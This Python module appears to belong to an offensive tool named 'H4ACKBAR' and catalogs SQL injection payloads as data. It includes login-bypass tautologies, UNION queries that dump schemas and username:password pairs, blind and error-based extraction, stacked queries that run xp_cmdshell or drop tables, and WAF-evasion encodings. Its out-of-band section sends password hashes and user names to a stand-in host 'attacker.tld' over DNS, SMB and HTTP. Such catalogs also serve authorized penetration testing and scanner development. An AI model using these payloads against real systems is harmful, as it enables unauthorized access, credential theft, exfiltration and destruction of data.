"""
H4ACKBAR payload catalog.
Pure data + generators. Zero side effects. Zero I/O.
Every entry: category / label / payload / notes / tags.
"""

from dataclasses import dataclass, field
from typing import List, Dict


@dataclass
class Payload:
    category: str
    label: str
    payload: str
    notes: str = ""
    tags: List[str] = field(default_factory=list)


# ─────────────────────────────────────────────────────────────
# 1. AUTH BYPASS
# ─────────────────────────────────────────────────────────────
AUTH_BYPASS = [
    Payload("auth", "OR 1=1 --",              "' OR 1=1 -- -",                 "Classic tautology"),
    Payload("auth", "OR 1=1 #",               "' OR 1=1#",                     "MySQL comment"),
    Payload("auth", "OR 'a'='a",              "' OR 'a'='a",                   "String tautology"),
    Payload("auth", "OR 1=1 LIMIT 1--",       "' OR 1=1 LIMIT 1-- -",          "Single row"),
    Payload("auth", "admin' --",              "admin' -- -",                   "Truncate password check"),
    Payload("auth", "admin' /*",              "admin'/*",                      "Block comment truncate"),
    Payload("auth", "') OR ('1'='1",          "') OR ('1'='1",                 "Paren break"),
    Payload("auth", "\") OR (\"1\"=\"1",      "\") OR (\"1\"=\"1",             "Double-quote paren break"),
    Payload("auth", "OR TRUE--",              "' OR TRUE-- -",                 "Boolean literal"),
    Payload("auth", "OR 1 IN (1)--",          "' OR 1 IN (1)-- -",             "IN clause"),
    Payload("auth", "OR EXISTS(SELECT 1)--",  "' OR EXISTS(SELECT 1)-- -",     "EXISTS subquery"),
    Payload("auth", "OR 1 BETWEEN 0 AND 2--", "' OR 1 BETWEEN 0 AND 2-- -",    "Range tautology"),
    Payload("auth", "NULL-byte truncate",     "admin\x00'",                    "Legacy MySQL <5.5"),
]


# ─────────────────────────────────────────────────────────────
# 2. UNION-BASED
# ─────────────────────────────────────────────────────────────
def union_variants(cols_max: int = 12) -> List[Payload]:
    out: List[Payload] = []
    # column-count probes
    for n in range(1, cols_max + 1):
        cols = ",".join(["NULL"] * n)
        out.append(Payload("union", f"UNION NULL x{n}",
                           f"' UNION SELECT {cols}-- -",
                           f"Test {n} columns"))
    # ORDER BY probes
    for n in range(1, cols_max + 1):
        out.append(Payload("union", f"ORDER BY {n}",
                           f"' ORDER BY {n}-- -",
                           f"Column-count probe {n}"))
    # data-type probes (string vs int)
    for n in range(1, cols_max + 1):
        placeholders = ",".join(
            [f"'h4x{i}'" if i == 1 else "NULL" for i in range(1, n + 1)]
        )
        out.append(Payload("union", f"UNION str@col1 x{n}",
                           f"' UNION SELECT {placeholders}-- -",
                           "String-capable column probe"))
    # schema extract — MySQL
    out += [
        Payload("union", "MySQL: schemas",
                "' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -",
                "List DBs (MySQL)"),
        Payload("union", "MySQL: tables",
                "' UNION SELECT table_name,NULL FROM information_schema.tables "
                "WHERE table_schema=database()-- -",
                "Tables in current DB"),
        Payload("union", "MySQL: columns",
                "' UNION SELECT column_name,NULL FROM information_schema.columns "
                "WHERE table_name='users'-- -",
                "Columns in table 'users'"),
        Payload("union", "MySQL: dump users",
                "' UNION SELECT CONCAT(username,0x3a,password),NULL FROM users-- -",
                "0x3a = ':' separator"),
        Payload("union", "MySQL: current user",
                "' UNION SELECT current_user(),NULL-- -", ""),
        Payload("union", "MySQL: version",
                "' UNION SELECT version(),NULL-- -", ""),
    ]
    # PostgreSQL
    out += [
        Payload("union", "PG: version",
                "' UNION SELECT version(),NULL-- -", "PostgreSQL version"),
        Payload("union", "PG: tables",
                "' UNION SELECT table_name,NULL FROM information_schema.tables-- -", ""),
        Payload("union", "PG: current_database",
                "' UNION SELECT current_database(),NULL-- -", ""),
    ]
    # MSSQL
    out += [
        Payload("union", "MSSQL: tables",
                "' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'-- -", ""),
        Payload("union", "MSSQL: version",
                "' UNION SELECT @@version,NULL-- -", ""),
    ]
    # Oracle
    out += [
        Payload("union", "Oracle: tables",
                "' UNION SELECT table_name,NULL FROM all_tables-- -", ""),
        Payload("union", "Oracle: banner",
                "' UNION SELECT banner,NULL FROM v$version-- -", ""),
    ]
    # SQLite
    out += [
        Payload("union", "SQLite: tables",
                "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'-- -", ""),
        Payload("union", "SQLite: version",
                "' UNION SELECT sqlite_version(),NULL-- -", ""),
    ]
    return out


# ─────────────────────────────────────────────────────────────
# 3. BOOLEAN-BLIND
# ─────────────────────────────────────────────────────────────
BOOLEAN_BLIND = [
    Payload("blind_bool", "TRUE probe",       "' AND 1=1-- -",   "Should render normally"),
    Payload("blind_bool", "FALSE probe",      "' AND 1=2-- -",   "Should differ from TRUE"),
    Payload("blind_bool", "SUBSTRING char",
            "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -",
            "Char-by-char extract"),
    Payload("blind_bool", "ASCII compare",
            "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64-- -",
            "Binary-search char"),
    Payload("blind_bool", "IF() branch (MySQL)",
            "' AND IF((SELECT COUNT(*) FROM users)>0,1,0)-- -", ""),
    Payload("blind_bool", "CASE branch (PG)",
            "' AND (CASE WHEN (SELECT 1)=1 THEN 1 ELSE 1/0 END)=1-- -",
            "Divide-by-zero flip"),
    Payload("blind_bool", "LENGTH probe",
            "' AND LENGTH((SELECT database()))>5-- -", ""),
]


# ─────────────────────────────────────────────────────────────
# 4. TIME-BLIND
# ─────────────────────────────────────────────────────────────
TIME_BLIND = [
    Payload("blind_time", "MySQL SLEEP",      "' AND SLEEP(5)-- -", "5s delay on TRUE"),
    Payload("blind_time", "MySQL BENCHMARK",
            "' AND IF(1=1,BENCHMARK(5000000,MD5('x')),0)-- -", "CPU stall"),
    Payload("blind_time", "PG pg_sleep",      "'; SELECT pg_sleep(5)-- -", ""),
    Payload("blind_time", "MSSQL WAITFOR",    "'; WAITFOR DELAY '0:0:5'-- -", ""),
    Payload("blind_time", "Oracle DBMS_LOCK", "' AND DBMS_LOCK.SLEEP(5)-- -", ""),
    Payload("blind_time", "Oracle heavy",
            "' AND 1=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3)-- -",
            "No SLEEP privilege"),
    Payload("blind_time", "SQLite heavy",
            "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))-- -", ""),
    Payload("blind_time", "MySQL conditional sleep",
            "' AND IF(SUBSTRING((SELECT database()),1,1)='a',SLEEP(5),0)-- -",
            "Conditional time-blind extract"),
]


# ─────────────────────────────────────────────────────────────
# 5. ERROR-BASED
# ─────────────────────────────────────────────────────────────
ERROR_BASED = [
    Payload("error", "MySQL extractvalue",
            "' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -",
            "0x7e = '~' delimiter"),
    Payload("error", "MySQL updatexml",
            "' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -", ""),
    Payload("error", "MySQL double query",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),"
            "FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
            "Duplicate group_by trick"),
    Payload("error", "PG cast error",
            "' AND CAST((SELECT version()) AS INT)-- -", "Text → int cast fail"),
    Payload("error", "MSSQL convert error",
            "' AND 1=CONVERT(INT,(SELECT @@version))-- -", ""),
    Payload("error", "Oracle CTXSYS.DRITHSX",
            "' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))=1-- -", ""),
]


# ─────────────────────────────────────────────────────────────
# 6. STACKED QUERIES
# ─────────────────────────────────────────────────────────────
STACKED = [
    Payload("stacked", "PG: create tbl",     "'; CREATE TABLE h4x(x INT)-- -", ""),
    Payload("stacked", "MSSQL: xp_cmdshell",
            "'; EXEC xp_cmdshell 'whoami'-- -",
            "Requires sysadmin + enabled xp"),
    Payload("stacked", "MySQL: multi (rare)",
            "'; SELECT 1;SELECT 2-- -",
            "Blocked in most MySQL clients"),
    Payload("stacked", "PG: drop demo",
            "'; DROP TABLE IF EXISTS h4x-- -", "Destructive — lab only"),
]


# ─────────────────────────────────────────────────────────────
# 7. OUT-OF-BAND
# ─────────────────────────────────────────────────────────────
OOB = [
    Payload("oob", "MySQL DNS (load_file)",
            "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',"
            "(SELECT HEX(password) FROM users LIMIT 1),'.attacker.tld\\\\a'))-- -",
            "SMB→DNS exfil, Windows MySQL"),
    Payload("oob", "MSSQL xp_dirtree",
            "'; EXEC master..xp_dirtree '\\\\attacker.tld\\a'-- -", ""),
    Payload("oob", "PG COPY TO PROGRAM",
            "'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.tld'-- -",
            "Superuser only"),
    Payload("oob", "Oracle UTL_HTTP",
            "' || UTL_HTTP.REQUEST('http://attacker.tld/'||(SELECT user FROM dual))--",
            ""),
]


# ─────────────────────────────────────────────────────────────
# 8. SELF-REFERENTIAL / RECURSIVE
# ─────────────────────────────────────────────────────────────
SELF_REF = [
    Payload("self_ref", "Recursive CTE (PG)",
            "'; WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM r WHERE n<10) "
            "SELECT * FROM r-- -", "Recursion depth probe"),
    Payload("self_ref", "Self-join dump",
            "' UNION SELECT a.username,b.password FROM users a,users b "
            "WHERE a.id=b.id-- -", ""),
    Payload("self_ref", "Nested subquery",
            "' AND (SELECT (SELECT (SELECT 1)))-- -",
            "Parser depth stress"),
    Payload("self_ref", "Self-refer via info_schema",
            "' UNION SELECT GROUP_CONCAT(table_name),NULL FROM "
            "(SELECT table_name FROM information_schema.tables "
            "WHERE table_schema=database()) t-- -", ""),
    Payload("self_ref", "Recursive tables (MySQL 8)",
            "' UNION SELECT * FROM (WITH RECURSIVE c(n) AS "
            "(SELECT 1 UNION ALL SELECT n+1 FROM c WHERE n<5) SELECT n FROM c) x-- -", ""),
]


# ─────────────────────────────────────────────────────────────
# 9. WAF-BYPASS / OBFUSCATION SEEDS
# ─────────────────────────────────────────────────────────────
WAF_BYPASS = [
    Payload("waf", "Case-toggle",         "' oR 1=1-- -",                  ""),
    Payload("waf", "Inline comment",      "'/**/OR/**/1=1-- -",            "Space→/**/"),
    Payload("waf", "Versioned comment",   "'/*!50000OR*/1=1-- -",          "MySQL only"),
    Payload("waf", "Whitespace tab",      "'\tOR\t1=1-- -",                ""),
    Payload("waf", "Newline",             "'\nOR\n1=1-- -",                ""),
    Payload("waf", "Backticks (MySQL)",   "' OR 1=`1`-- -",                ""),
    Payload("waf", "Scientific notation", "' OR 1.e1=10-- -",              ""),
    Payload("waf", "Double URL-encoded",  "%2527%2520OR%25201%253D1--",    "Rendered by proxy layer"),
    Payload("waf", "Unicode-space",       "'\u00a0OR\u00a01=1-- -",        "NBSP as whitespace"),
]


def all_payloads() -> List[Payload]:
    return (
        AUTH_BYPASS
        + union_variants(12)
        + BOOLEAN_BLIND
        + TIME_BLIND
        + ERROR_BASED
        + STACKED
        + OOB
        + SELF_REF
        + WAF_BYPASS
    )


def categories() -> Dict[str, str]:
    return {
        "auth":       "Auth Bypass",
        "union":      "UNION-Based",
        "blind_bool": "Boolean Blind",
        "blind_time": "Time Blind",
        "error":      "Error-Based",
        "stacked":    "Stacked Queries",
        "oob":        "Out-of-Band",
        "self_ref":   "Self-Referential",
        "waf":        "WAF Bypass",
    }
